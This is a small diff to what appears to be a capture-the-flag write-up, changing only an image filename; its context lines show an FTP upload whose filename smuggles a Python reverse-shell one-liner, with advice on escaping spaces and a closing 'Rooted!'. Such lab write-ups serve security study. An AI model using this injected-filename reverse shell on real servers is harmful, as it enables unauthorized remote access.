@@ -411,6 +411,6 @@ ftp> put test "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\
 
 Remember to have a backslash behind all spaces and spaces to allow the upload to work. After waiting for a little while, we would get a reverse shell on the specified port.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (2) (3).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
